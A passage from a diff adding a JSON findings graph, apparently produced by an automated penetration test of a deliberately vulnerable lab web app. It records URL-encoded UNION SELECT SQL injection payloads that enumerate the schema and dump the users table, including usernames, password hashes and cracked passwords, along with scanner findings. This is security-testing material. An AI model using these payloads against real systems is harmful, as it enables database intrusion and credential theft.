+      "target": "172.28.0.2/vulnerabilities/sqli/?id=1%20union%20select%201,%20version(),3--&submit=submit&user_token=ec70f7d86ed11cfdd3688c4fed1d7f1d",
+      "generality": 0.6785714285714286,
+      "state": "resolved",
+      "downstream": 0,
+      "evidence": [
+        {
+          "timestamp": "20:32:23",
+          "tool": "curl",
+          "exit_signal": "  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current\u2026",
+          "tier": "T3"
+        }
+      ],
+      "decision": null,
+      "signal": "cdf6f1cd28e9"
+    },
+    {
+      "id": "curl:172.28.0.2/vulnerabilities/sqli/?id=1%27%20union%20select%201,version()--%20-&submit=submit&user_token=ec70f7d86ed11cfdd3688c4fed1d7f1d:e512a1a6a299",
+      "cause_class": "curl",
+      "target": "172.28.0.2/vulnerabilities/sqli/?id=1%27%20union%20select%201,version()--%20-&submit=submit&user_token=ec70f7d86ed11cfdd3688c4fed1d7f1d",
+      "generality": 0.6785714285714286,
+      "state": "resolved",
+      "downstream": 0,
+      "evidence": [
+        {
+          "timestamp": "20:33:37",
+          "tool": "curl",
+          "exit_signal": "  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current\u2026",
+          "tier": "T3"
+        }
+      ],
+      "decision": null,
+      "signal": "e512a1a6a299"
+    },
+    {
+      "id": "curl:172.28.0.2/vulnerabilities/sqli/?id=1%27%20union%20select%201,database()--%20-%26submit=submit&user_token=ec70f7d86ed11cfdd3688c4fed1d7f1d:f0a3b3064189",
+      "cause_class": "curl",
+      "target": "172.28.0.2/vulnerabilities/sqli/?id=1%27%20union%20select%201,database()--%20-%26submit=submit&user_token=ec70f7d86ed11cfdd3688c4fed1d7f1d",
+      "generality": 0.6785714285714286,
+      "state": "resolved",
+      "downstream": 1,
+      "evidence": [
+        {
+          "timestamp": "20:35:00",
+          "tool": "curl",
+          "exit_signal": "  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current\u2026",
+          "tier": "T3"
+        }
+      ],
+      "decision": null,
+      "signal": "f0a3b3064189"
+    },
+    {
+      "id": "curl:172.28.0.2/vulnerabilities/sqli/?id=1%27%20union%20select%201,database()--%20-&submit=submit&user_token=ec70f7d86ed11cfdd3688c4fed1d7f1d:d7c1554cd886",
+      "cause_class": "curl",
+      "target": "172.28.0.2/vulnerabilities/sqli/?id=1%27%20union%20select%201,database()--%20-&submit=submit&user_token=ec70f7d86ed11cfdd3688c4fed1d7f1d",
+      "generality": 0.6785714285714286,
+      "state": "resolved",
+      "downstream": 0,
+      "evidence": [
+        {
+          "timestamp": "20:37:03",
+          "tool": "curl",
+          "exit_signal": "  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current\u2026",
+          "tier": "T3"
+        }
+      ],
+      "decision": null,
+      "signal": "d7c1554cd886"
+    },
+    {
+      "id": "curl:172.28.0.2/vulnerabilities/sqli/?id=1%27%20union%20select%201,database()--%20-%26submit=submit&user_token=ec70f7d86ed11cfdd3688c4fed1d7f1d:6cc04b32532c",
+      "cause_class": "curl",
+      "target": "172.28.0.2/vulnerabilities/sqli/?id=1%27%20union%20select%201,database()--%20-%26submit=submit&user_token=ec70f7d86ed11cfdd3688c4fed1d7f1d",
+      "generality": 0.6785714285714286,
+      "state": "resolved",
+      "downstream": 0,
+      "evidence": [
+        {
+          "timestamp": "20:38:02",
+          "tool": "curl",
+          "exit_signal": "  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current\u2026",
+          "tier": "T3"
+        }
+      ],
+      "decision": null,
+      "signal": "6cc04b32532c"
+    },
+    {
+      "id": "curl:172.28.0.2/vulnerabilities/sqli/?id=1%27%20union%20select%201,table_name%20from%20information_schema.tables%20where%20table_schema%3d%27dvwa%27--%20-%26submit=submit&user_token=ec70f7d86ed11cfdd3688c4fed1d7f1d:9d502d3f57a2",
+      "cause_class": "curl",
+      "target": "172.28.0.2/vulnerabilities/sqli/?id=1%27%20union%20select%201,table_name%20from%20information_schema.tables%20where%20table_schema%3d%27dvwa%27--%20-%26submit=submit&user_token=ec70f7d86ed11cfdd3688c4fed1d7f1d",
+      "generality": 0.6785714285714286,
+      "state": "resolved",
+      "downstream": 1,
+      "evidence": [
+        {
+          "timestamp": "20:39:17",
+          "tool": "curl",
+          "exit_signal": "  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current\u2026",
+          "tier": "T3"
+        }
+      ],
+      "decision": null,
+      "signal": "9d502d3f57a2"
+    },
+    {
+      "id": "curl:172.28.0.2/vulnerabilities/sqli/?id=1%27%20union%20select%201,table_name%20from%20information_schema.tables%20where%20table_schema%3d%27dvwa%27--%20-&submit=submit&user_token=ec70f7d86ed11cfdd3688c4fed1d7f1d:2a9a4192b7c8",
+      "cause_class": "curl",
+      "target": "172.28.0.2/vulnerabilities/sqli/?id=1%27%20union%20select%201,table_name%20from%20information_schema.tables%20where%20table_schema%3d%27dvwa%27--%20-&submit=submit&user_token=ec70f7d86ed11cfdd3688c4fed1d7f1d",
+      "generality": 0.6785714285714286,
+      "state": "resolved",
+      "downstream": 0,
+      "evidence": [
+        {
+          "timestamp": "20:40:31",
+          "tool": "curl",
+          "exit_signal": "  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current\u2026",
+          "tier": "T3"
+        }
+      ],
+      "decision": null,
+      "signal": "2a9a4192b7c8"
+    },
+    {
+      "id": "curl:172.28.0.2/vulnerabilities/sqli/?id=1%27%20union%20select%201,table_name%20from%20information_schema.tables%20where%20table_schema%3d%27dvwa%27--%20-%26submit=submit&user_token=ec70f7d86ed11cfdd3688c4fed1d7f1d:53ee8d2593db",
+      "cause_class": "curl",
+      "target": "172.28.0.2/vulnerabilities/sqli/?id=1%27%20union%20select%201,table_name%20from%20information_schema.tables%20where%20table_schema%3d%27dvwa%27--%20-%26submit=submit&user_token=ec70f7d86ed11cfdd3688c4fed1d7f1d",
+      "generality": 0.6785714285714286,
+      "state": "resolved",
+      "downstream": 0,
+      "evidence": [
+        {
+          "timestamp": "20:41:41",
+          "tool": "curl",
+          "exit_signal": "  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current\u2026",
+          "tier": "T3"
+        }
+      ],
+      "decision": null,
+      "signal": "53ee8d2593db"
+    },
+    {
+      "id": "curl:172.28.0.2/vulnerabilities/sqli/?id=1%27%20union%20select%20column_name,2%20from%20information_schema.columns%20where%20table_name%3d%27users%27--%20-%26submit=submit&user_token=ec70f7d86ed11cfdd3688c4fed1d7f1d:21db8785c94d",
+      "cause_class": "curl",
+      "target": "172.28.0.2/vulnerabilities/sqli/?id=1%27%20union%20select%20column_name,2%20from%20information_schema.columns%20where%20table_name%3d%27users%27--%20-%26submit=submit&user_token=ec70f7d86ed11cfdd3688c4fed1d7f1d",
+      "generality": 0.6785714285714286,
+      "state": "resolved",
+      "downstream": 1,
+      "evidence": [
+        {
+          "timestamp": "20:43:00",
+          "tool": "curl",
+          "exit_signal": "  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current\u2026",
+          "tier": "T3"
+        }
+      ],
+      "decision": null,
+      "signal": "21db8785c94d"
+    },
+    {
+      "id": "curl:172.28.0.2/vulnerabilities/sqli/?id=1%27%20union%20select%201,2%20from%20information_schema.columns%20where%20table_name%3d%27users%27--%20-%26submit=submit&user_token=ec70f7d86ed11cfdd3688c4fed1d7f1d:56a993ebe875",
+      "cause_class": "curl",
+      "target": "172.28.0.2/vulnerabilities/sqli/?id=1%27%20union%20select%201,2%20from%20information_schema.columns%20where%20table_name%3d%27users%27--%20-%26submit=submit&user_token=ec70f7d86ed11cfdd3688c4fed1d7f1d",
+      "generality": 0.6785714285714286,
+      "state": "resolved",
+      "downstream": 1,
+      "evidence": [
+        {
+          "timestamp": "20:44:40",
+          "tool": "curl",
+          "exit_signal": "  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current\u2026",
+          "tier": "T3"
+        }
+      ],
+      "decision": null,
+      "signal": "56a993ebe875"
+    },
+    {
+      "id": "curl:172.28.0.2/vulnerabilities/sqli/?id=1%27%20union%20select%20user,password%20from%20users--%20-%26submit=submit&user_token=ec70f7d86ed11cfdd3688c4fed1d7f1d:e0a9d3da4a0f",
+      "cause_class": "curl",
+      "target": "172.28.0.2/vulnerabilities/sqli/?id=1%27%20union%20select%20user,password%20from%20users--%20-%26submit=submit&user_token=ec70f7d86ed11cfdd3688c4fed1d7f1d",
+      "generality": 0.6785714285714286,
+      "state": "resolved",
+      "downstream": 3,
+      "evidence": [
+        {
+          "timestamp": "20:45:56",
+          "tool": "curl",
+          "exit_signal": "  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current\u2026",
+          "tier": "T3"
+        }
+      ],
+      "decision": null,
+      "signal": "e0a9d3da4a0f"
+    },
+    {
+      "id": "curl:172.28.0.2/vulnerabilities/sqli/?id=1%27%20union%20select%20user,password%20from%20users--%20-%26submit=submit&user_token=ec70f7d86ed11cfdd3688c4fed1d7f1d:635c1dae4602",
+      "cause_class": "curl",
+      "target": "172.28.0.2/vulnerabilities/sqli/?id=1%27%20union%20select%20user,password%20from%20users--%20-%26submit=submit&user_token=ec70f7d86ed11cfdd3688c4fed1d7f1d",
+      "generality": 0.6785714285714286,
+      "state": "resolved",
+      "downstream": 2,
+      "evidence": [
+        {
+          "timestamp": "20:47:27",
+          "tool": "curl",
+          "exit_signal": "  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current\u2026",
+          "tier": "T3"
+        }
+      ],
+      "decision": null,
+      "signal": "635c1dae4602"
+    },
+    {
+      "id": "curl:172.28.0.2/vulnerabilities/sqli/?id=1%27%20union%20select%20column_name,2%20from%20information_schema.columns%20where%20table_name%3d%27users%27--%20-%26submit=submit&user_token=ec70f7d86ed11cfdd3688c4fed1d7f1d:56a993ebe875",
+      "cause_class": "curl",
+      "target": "172.28.0.2/vulnerabilities/sqli/?id=1%27%20union%20select%20column_name,2%20from%20information_schema.columns%20where%20table_name%3d%27users%27--%20-%26submit=submit&user_token=ec70f7d86ed11cfdd3688c4fed1d7f1d",
+      "generality": 0.6785714285714286,
+      "state": "resolved",
+      "downstream": 0,
+      "evidence": [
+        {
+          "timestamp": "20:47:56",
+          "tool": "curl",
+          "exit_signal": "  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current\u2026",
+          "tier": "T3"
+        }
+      ],
+      "decision": null,
+      "signal": "56a993ebe875"
+    },
+    {
+      "id": "curl:172.28.0.2/vulnerabilities/sqli/?id=1%27%20union%20select%201,2%20from%20information_schema.columns%20where%20table_name%3d%27users%27--%20-%26submit=submit&user_token=ec70f7d86ed11cfdd3688c4fed1d7f1d:566d357d06b9",
+      "cause_class": "curl",
+      "target": "172.28.0.2/vulnerabilities/sqli/?id=1%27%20union%20select%201,2%20from%20information_schema.columns%20where%20table_name%3d%27users%27--%20-%26submit=submit&user_token=ec70f7d86ed11cfdd3688c4fed1d7f1d",
+      "generality": 0.6785714285714286,
+      "state": "resolved",
+      "downstream": 0,
+      "evidence": [
+        {
+          "timestamp": "15:05:38",
+          "tool": "curl",
+          "exit_signal": "  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current\u2026",
+          "tier": "T3"
+        }
+      ],
+      "decision": null,
+      "signal": "566d357d06b9"
+    },
+    {
+      "id": "curl:172.28.0.2/vulnerabilities/sqli/?id=1%27%20union%20select%20user,password%20from%20users--%20-%26submit=submit&user_token=ec70f7d86ed11cfdd3688c4fed1d7f1d:a07fabc03c53",
+      "cause_class": "curl",
+      "target": "172.28.0.2/vulnerabilities/sqli/?id=1%27%20union%20select%20user,password%20from%20users--%20-%26submit=submit&user_token=ec70f7d86ed11cfdd3688c4fed1d7f1d",
+      "generality": 0.6785714285714286,
+      "state": "resolved",
+      "downstream": 1,
+      "evidence": [
+        {
+          "timestamp": "15:08:07",
+          "tool": "curl",
+          "exit_signal": "  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current\u2026",
+          "tier": "T3"
+        }
+      ],
+      "decision": null,
+      "signal": "a07fabc03c53"
+    },
+    {
+      "id": "curl:172.28.0.2/vulnerabilities/sqli/?id=1%27%20union%20select%20user,password%20from%20users--%20-%26submit=submit&user_token=ec70f7d86ed11cfdd3688c4fed1d7f1d:f75a42e6e77e",
+      "cause_class": "curl",
+      "target": "172.28.0.2/vulnerabilities/sqli/?id=1%27%20union%20select%20user,password%20from%20users--%20-%26submit=submit&user_token=ec70f7d86ed11cfdd3688c4fed1d7f1d",
+      "generality": 0.6785714285714286,
+      "state": "resolved",
+      "downstream": 0,
+      "evidence": [
+        {
+          "timestamp": "15:09:51",
+          "tool": "curl",
+          "exit_signal": "  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current\u2026",
+          "tier": "T3"
+        }
+      ],
+      "decision": null,
+      "signal": "f75a42e6e77e"
+    },
+    {
+      "id": "curl:172.28.0.2/vulnerabilities/sqli/?id=1%27%20union%20select%20user,password%20from%20users--%20-&submit=submit&user_token=ec70f7d86ed11cfdd3688c4fed1d7f1d:89472b75ab7f",
+      "cause_class": "curl",
+      "target": "172.28.0.2/vulnerabilities/sqli/?id=1%27%20union%20select%20user,password%20from%20users--%20-&submit=submit&user_token=ec70f7d86ed11cfdd3688c4fed1d7f1d",
+      "generality": 0.6785714285714286,
+      "state": "resolved",
+      "downstream": 0,
+      "evidence": [
+        {
+          "timestamp": "15:34:01",
+          "tool": "curl",
+          "exit_signal": "real UNION SELECT dump confirmed in the raw response body (5228 bytes) -- admin/5f4dcc3b5aa765d61d8327deb882cf99 (password), admin/admin, gordonb/e99a18c428cb38d5f260853678922e03 (abc123), 1337/8d3533d75ae2c3966d7e0d4fcc69216b (charley), pablo/0d107d09f5bbe40cade3de5c71e9e9b7 (letmein), smithy/5f4dcc3b5aa765d61d8327deb882cf99 (password)",
+          "tier": "T3"
+        }
+      ],
+      "decision": null,
+      "signal": "creds: admin,gordonb,1337,pablo,smithy (see report)"
+    }
+  ],
+  "open_items": [
+    {
+      "id": "pruned:172.28.0.2/setup.php:sql-injection-attempt:172.28.0.2/setup.php:no-injection-found",
+      "cause_class": "dead-region",
+      "target": "172.28.0.2/setup.php",
+      "generality": 0.17857142857142858,
+      "state": "blocked",
+      "downstream": 5,
+      "evidence": [
+        {
+          "timestamp": "17:17:22",
+          "tool": "prune",
+          "exit_signal": "collapsed 1 dead nodes: sql-injection-attempt:172.28.0.2/setup.php:no-injection-found",
+          "tier": "T3"
+        }
+      ],
+      "decision": null,
+      "signal": "sql-injection-attempt:172.28.0.2/setup.php:no-injection-found"
+    },
+    {
+      "id": "pruned:172.28.0.2/login.php:pruned:172.28.0.2/login.php:info-header:172.28.0.2/login.php:X-Frame-Options+sql-injection-attempt:172.28.0.2/login.php:no-injection-found",
+      "cause_class": "dead-region",
+      "target": "172.28.0.2/login.php",
+      "generality": 0.17857142857142858,
+      "state": "blocked",
+      "downstream": 7,
+      "evidence": [
+        {
+          "timestamp": "17:18:20",
+          "tool": "prune",
+          "exit_signal": "collapsed 2 dead nodes: pruned:172.28.0.2/login.php:info-header:172.28.0.2/login.php:X-Frame-Options, sql-injection-attempt:172.28.0.2/login.php:no-injection-found",
+          "tier": "T3"
+        }
+      ],
+      "decision": null,
+      "signal": "pruned:172.28.0.2/login.php:info-header:172.28.0.2/login.php:X-Frame-Options+sql-injection-attempt:172.28.0.2/login.php:no-injection-found"
+    },
+    {
+      "id": "credential-found:172.28.0.2/setup.php:password=<em>******</em><br",
+      "cause_class": "credential-found",
+      "target": "172.28.0.2/setup.php",
+      "generality": 0.03571428571428571,
+      "state": "contested",
+      "downstream": 0,
+      "evidence": [
+        {
+          "timestamp": "17:24:19",
+          "tool": "curl",
+          "exit_signal": "password=<em>******</em><br",
+          "tier": "T2"
+        }
+      ],
+      "decision": null,
+      "signal": "password=<em>******</em><br"
+    },
+    {
+      "id": "info-header:172.28.0.2/login.php:X-Powered-By: PHP/7.4",
+      "cause_class": "info-header",
+      "target": "172.28.0.2/login.php",
+      "generality": 0.10714285714285714,
+      "state": "contested",
+      "downstream": 0,
+      "evidence": [
+        {
+          "timestamp": "17:25:25",
+          "tool": "curl",
+          "exit_signal": "The server reveals its PHP version.",
+          "tier": "T3"
+        },
+        {
+          "timestamp": "17:26:12",
+          "tool": "curl",
+          "exit_signal": "The server reveals its PHP version.",
+          "tier": "T3"
+        }
+      ],
+      "decision": null,
+      "signal": "X-Powered-By: PHP/7.4"
+    },
+    {
+      "id": "curl:172.28.0.2/login.php:04c253b9e763",
+      "cause_class": "curl",
+      "target": "172.28.0.2/login.php",
+      "generality": 0.6785714285714286,
+      "state": "contested",
+      "downstream": 5,
+      "evidence": [
+        {
+          "timestamp": "17:29:20",
+          "tool": "curl",
+          "exit_signal": "  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current\u2026",
+          "tier": "T3"
+        },
+        {
+          "timestamp": "17:37:59",
+          "tool": "curl",
+          "exit_signal": "  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current\u2026",
+          "tier": "T3"
+        },
+        {
+          "timestamp": "17:40:50",
+          "tool": "curl",
+          "exit_signal": "  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current\u2026",
+          "tier": "T3"
+        }
+      ],
+      "decision": null,
+      "signal": "04c253b9e763"
+    },
+    {
+      "id": "sql-injection-attempt:172.28.0.2/setup.php:no-injection-found",
+      "cause_class": "sql-injection-attempt",
+      "target": "172.28.0.2/setup.php",
+      "generality": 0.03571428571428571,
+      "state": "blocked",
+      "downstream": 3,
+      "evidence": [
+        {
+          "timestamp": "17:40:00",
+          "tool": "sqlmap",
+          "exit_signal": "ToolTimeoutError: sqlmap: timed out after 90s",
+          "tier": "T3"
+        }
+      ],
+      "decision": null,
+      "signal": "no-injection-found"
+    },
+    {
+      "id": "info-header:172.28.0.2/setup.php:X-Powered-By",
+      "cause_class": "info-header",
+      "target": "172.28.0.2/setup.php",
+      "generality": 0.10714285714285714,
+      "state": "contested",
+      "downstream": 0,
+      "evidence": [
+        {
+          "timestamp": "17:41:32",
+          "tool": "curl",
+          "exit_signal": "Information disclosure via X-Powered-By header.",
+          "tier": "T3"
+        }
+      ],
+      "decision": null,
+      "signal": "X-Powered-By"
+    },
+    {
+      "id": "info-header:172.28.0.2/setup.php:Server",
+      "cause_class": "info-header",
+      "target": "172.28.0.2/setup.php",
+      "generality": 0.10714285714285714,
+      "state": "contested",
+      "downstream": 0,
+      "evidence": [
+        {
+          "timestamp": "17:41:32",
+          "tool": "curl",
+          "exit_signal": "Server software version is disclosed.",
+          "tier": "T3"
+        }
+      ],
+      "decision": null,
+      "signal": "Server"
+    },
+    {
+      "id": "info-header:172.28.0.2/setup.php:X-Frame-Options",
+      "cause_class": "info-header",
+      "target": "172.28.0.2/setup.php",
+      "generality": 0.10714285714285714,
+      "state": "blocked",
+      "downstream": 0,
+      "evidence": [
+        {
+          "timestamp": "17:41:32",
+          "tool": "curl",
+          "exit_signal": "X-Frame-Options header is present and restrictive.",
+          "tier": "T3"
+        }
+      ],
+      "decision": null,
+      "signal": "X-Frame-Options"
+    },
+    {
+      "id": "pruned:172.28.0.2/vulnerabilities/sqli/?id=1 order by 2-- -&submit=submit&user_token=ec70f7d86ed11cfdd3688c4fed1d7f1d:tool-error:172.28.0.2/vulnerabilities/sqli/?id=1 order by 2-- -&submit=submit&user_token=ec70f7d86ed11cfdd3688c4fed1d7f1d:URL rejected",
+      "cause_class": "dead-region",
+      "target": "172.28.0.2/vulnerabilities/sqli/?id=1 order by 2-- -&submit=submit&user_token=ec70f7d86ed11cfdd3688c4fed1d7f1d",
+      "generality": 0.17857142857142858,
+      "state": "blocked",
+      "downstream": 0,
+      "evidence": [
+        {
+          "timestamp": "17:59:48",
+          "tool": "prune",
+          "exit_signal": "collapsed 1 dead nodes: tool-error:172.28.0.2/vulnerabilities/sqli/?id=1 order by 2-- -&submit=submit&user_token=ec70f7d86ed11cfdd3688c4fed1d7f1d:URL rejected",
+          "tier": "T3"
+        }
+      ],
+      "decision": null,
+      "signal": "tool-error:172.28.0.2/vulnerabilities/sqli/?id=1 order by 2-- -&submit=submit&user_token=ec70f7d86ed11cfdd3688c4fed1d7f1d:URL rejected"
+    },
+    {
+      "id": "pruned:172.28.0.2/vulnerabilities/sqli/?id=1 order by 2-- -&submit=submit&user_token=ec70f7d86ed11cfdd3688c4fed1d7f1d:tool-error:172.28.0.2/vulnerabilities/sqli/?id=1 order by 2-- -&submit=submit&user_token=ec70f7d86ed11cfdd3688c4fed1d7f1d:curl exited 3",
+      "cause_class": "dead-region",
+      "target": "172.28.0.2/vulnerabilities/sqli/?id=1 order by 2-- -&submit=submit&user_token=ec70f7d86ed11cfdd3688c4fed1d7f1d",
+      "generality": 0.17857142857142858,
+      "state": "blocked",
+      "downstream": 0,
+      "evidence": [
+        {
+          "timestamp": "17:59:48",
+          "tool": "prune",
+          "exit_signal": "collapsed 1 dead nodes: tool-error:172.28.0.2/vulnerabilities/sqli/?id=1 order by 2-- -&submit=submit&user_token=ec70f7d86ed11cfdd3688c4fed1d7f1d:curl exited 3",
+          "tier": "T3"
+        }
+      ],
+      "decision": null,
+      "signal": "tool-error:172.28.0.2/vulnerabilities/sqli/?id=1 order by 2-- -&submit=submit&user_token=ec70f7d86ed11cfdd3688c4fed1d7f1d:curl exited 3"
+    },
+    {
+      "id": "pruned:172.28.0.2/vulnerabilities/sqli/?id=1 order by 3--&submit=submit&user_token=ec70f7d86ed11cfdd3688c4fed1d7f1d:tool-error:172.28.0.2/vulnerabilities/sqli/?id=1 order by 3--&submit=submit&user_token=ec70f7d86ed11cfdd3688c4fed1d7f1d:URL rejected",
+      "cause_class": "dead-region",
+      "target": "172.28.0.2/vulnerabilities/sqli/?id=1 order by 3--&submit=submit&user_token=ec70f7d86ed11cfdd3688c4fed1d7f1d",
+      "generality": 0.17857142857142858,
+      "state": "blocked",
+      "downstream": 0,
+      "evidence": [
+        {
+          "timestamp": "18:02:16",
+          "tool": "prune",
+          "exit_signal": "collapsed 1 dead nodes: tool-error:172.28.0.2/vulnerabilities/sqli/?id=1 order by 3--&submit=submit&user_token=ec70f7d86ed11cfdd3688c4fed1d7f1d:URL rejected",
+          "tier": "T3"
+        }
+      ],
+      "decision": null,
+      "signal": "tool-error:172.28.0.2/vulnerabilities/sqli/?id=1 order by 3--&submit=submit&user_token=ec70f7d86ed11cfdd3688c4fed1d7f1d:URL rejected"
+    },
+    {
+      "id": "pruned:172.28.0.2/vulnerabilities/sqli/?id=1 order by 3--&submit=submit&user_token=ec70f7d86ed11cfdd3688c4fed1d7f1d:tool-error:172.28.0.2/vulnerabilities/sqli/?id=1 order by 3--&submit=submit&user_token=ec70f7d86ed11cfdd3688c4fed1d7f1d:curl exited 3",
+      "cause_class": "dead-region",
+      "target": "172.28.0.2/vulnerabilities/sqli/?id=1 order by 3--&submit=submit&user_token=ec70f7d86ed11cfdd3688c4fed1d7f1d",
+      "generality": 0.17857142857142858,
+      "state": "blocked",
+      "downstream": 0,
+      "evidence": [
+        {
+          "timestamp": "18:02:16",
+          "tool": "prune",
+          "exit_signal": "collapsed 1 dead nodes: tool-error:172.28.0.2/vulnerabilities/sqli/?id=1 order by 3--&submit=submit&user_token=ec70f7d86ed11cfdd3688c4fed1d7f1d:curl exited 3",
+          "tier": "T3"
+        }
+      ],
+      "decision": null,
+      "signal": "tool-error:172.28.0.2/vulnerabilities/sqli/?id=1 order by 3--&submit=submit&user_token=ec70f7d86ed11cfdd3688c4fed1d7f1d:curl exited 3"
+    },
+    {
+      "id": "pruned:172.28.0.2/vulnerabilities/sqli/?id=1' union select 1,database()-- -&submit=submit&user_token=ec70f7d86ed11cfdd3688c4fed1d7f1d:curl:172.28.0.2/vulnerabilities/sqli/?id=1' union select 1,database()-- -&submit=submit&user_token=ec70f7d86ed11cfdd3688c4fed1d7f1d:c917d2f1a67e",
+      "cause_class": "dead-region",
+      "target": "172.28.0.2/vulnerabilities/sqli/?id=1' union select 1,database()-- -&submit=submit&user_token=ec70f7d86ed11cfdd3688c4fed1d7f1d",
+      "generality": 0.17857142857142858,
+      "state": "blocked",
+      "downstream": 0,
+      "evidence": [
+        {
+          "timestamp": "20:36:03",
+          "tool": "prune",
+          "exit_signal": "collapsed 1 dead nodes: curl:172.28.0.2/vulnerabilities/sqli/?id=1' union select 1,database()-- -&submit=submit&user_token=ec70f7d86ed11cfdd3688c4fed1d7f1d:c917d2f1a67e",
+          "tier": "T3"
+        }
+      ],
+      "decision": null,
+      "signal": "curl:172.28.0.2/vulnerabilities/sqli/?id=1' union select 1,database()-- -&submit=submit&user_token=ec70f7d86ed11cfdd3688c4fed1d7f1d:c917d2f1a67e"
+    }
+  ],
+  "edges": [
+    {
+      "parent": "open-port:172.28.0.2:80/tcp",
+      "child": "waf-absent:172.28.0.2:no-waf-detected",
+      "weight": 1.0
+    },
+    {
+      "parent": "open-port:172.28.0.2:80/tcp",
+      "child": "exposed-path:172.28.0.2:/docs (301)",
+      "weight": 1.0
+    },
+    {
+      "parent": "open-port:172.28.0.2:80/tcp",
+      "child": "exposed-path:172.28.0.2:/robots.txt (200)",
+      "weight": 1.0
+    },
+    {
+      "parent": "open-port:172.28.0.2:80/tcp",
+      "child": "exposed-path:172.28.0.2:/config (301)",
+      "weight": 1.0
+    },
+    {
+      "parent": "open-port:172.28.0.2:80/tcp",
+      "child": "exposed-path:172.28.0.2:/phpinfo.php (302)",
+      "weight": 1.0
+    },
+    {
+      "parent": "open-port:172.28.0.2:80/tcp",
+      "child": "exposed-path:172.28.0.2:/setup.php (200)",
+      "weight": 1.0
+    },
+    {
+      "parent": "open-port:172.28.0.2:80/tcp",
+      "child": "server-banner:172.28.0.2:Apache/2.4.25 (Debian)",
+      "weight": 1.0
+    },
+    {
+      "parent": "open-port:172.28.0.2:80/tcp",
+      "child": "nikto-finding:172.28.0.2:[600050] Apache/2.4.25 appears to be outdated (current is at least 2.4.68).",
+      "weight": 1.0
+    },
+    {
+      "parent": "open-port:172.28.0.2:80/tcp",
+      "child": "nikto-finding:172.28.0.2:[013587] /: Suggested security header missing: permissions-policy. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Permissions-Policy",
+      "weight": 1.0
+    },
+    {
+      "parent": "open-port:172.28.0.2:80/tcp",
+      "child": "nikto-finding:172.28.0.2:[013587] /: Suggested security header missing: strict-transport-security. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Strict-Transport-Securi",
+      "weight": 1.0
+    },
+    {
+      "parent": "open-port:172.28.0.2:80/tcp",
+      "child": "nikto-finding:172.28.0.2:[013587] /: Suggested security header missing: x-content-type-options. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Content-Type-Options",
+      "weight": 1.0
+    },
+    {
+      "parent": "open-port:172.28.0.2:80/tcp",
+      "child": "nikto-finding:172.28.0.2:[013587] /: Suggested security header missing: referrer-policy. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Referrer-Policy",
+      "weight": 1.0
+    },
+    {
+      "parent": "open-port:172.28.0.2:80/tcp",
+      "child": "nikto-finding:172.28.0.2:[013587] /: Suggested security header missing: content-security-policy. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP",
+      "weight": 1.0
+    },
+    {
+      "parent": "open-port:172.28.0.2:80/tcp",
+      "child": "nikto-finding:172.28.0.2:[750500] /config/: Directory indexing found. See: CWE-548",
+      "weight": 1.0
+    },
+    {
+      "parent": "open-port:172.28.0.2:80/tcp",
+      "child": "nikto-finding:172.28.0.2:[000998] /config/: Configuration information may be available remotely.",
+      "weight": 1.0
+    },
+    {
+      "parent": "open-port:172.28.0.2:80/tcp",
+      "child": "nikto-finding:172.28.0.2:[750500] /docs/: Directory indexing found. See: CWE-548",
+      "weight": 1.0
+    },
+    {
+      "parent": "open-port:172.28.0.2:80/tcp",
+      "child": "nikto-finding:172.28.0.2:[003584] /icons/README: Apache default file found. See: https://www.vntweb.co.uk/apache-restricting-access-to-iconsreadme/",
+      "weight": 1.0
+    },
+    {
+      "parent": "open-port:172.28.0.2:80/tcp",
+      "child": "nikto-finding:172.28.0.2:[006333] /login.php: Admin login page/section found.",
+      "weight": 1.0
+    },
+    {
+      "parent": "open-port:172.28.0.2:80/tcp",
+      "child": "nikto-finding:172.28.0.2:[007224] /.gitignore: .gitignore file found. It is possible to grasp the directory structure.",
+      "weight": 1.0
+    },
+    {
+      "parent": "open-port:172.28.0.2:80/tcp",
+      "child": "nikto-finding:172.28.0.2:[007342] /: X-Frame-Options header is deprecated and was replaced with the Content-Security-Policy HTTP header with the frame-ancestors directive. See: https://",
+      "weight": 1.0
+    },
+    {
+      "parent": "open-port:172.28.0.2:80/tcp",
+      "child": "nikto-finding:172.28.0.2:[007352] /: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME t",
+      "weight": 1.0
+    },
+    {
+      "parent": "pruned:172.28.0.2/setup.php:sql-injection-attempt:172.28.0.2/setup.php:no-injection-found",
+      "child": "credential-found:172.28.0.2/setup.php:password=<em>******</em><br",
+      "weight": 1.0
+    },
+    {
+      "parent": "pruned:172.28.0.2/login.php:pruned:172.28.0.2/login.php:info-header:172.28.0.2/login.php:X-Frame-Options+sql-injection-attempt:172.28.0.2/login.php:no-injection-found",
+      "child": "info-header:172.28.0.2/login.php:X-Powered-By: PHP/7.4",
+      "weight": 1.0
+    },
+    {
+      "parent": "pruned:172.28.0.2/login.php:pruned:172.28.0.2/login.php:info-header:172.28.0.2/login.php:X-Frame-Options+sql-injection-attempt:172.28.0.2/login.php:no-injection-found",
+      "child": "curl:172.28.0.2/login.php:04c253b9e763",
+      "weight": 1.0
+    },
+    {
+      "parent": "curl:172.28.0.2/login.php:04c253b9e763",
+      "child": "outdated-server-header:172.28.0.2/login.php:Apache/2.4.25 (Debian)",
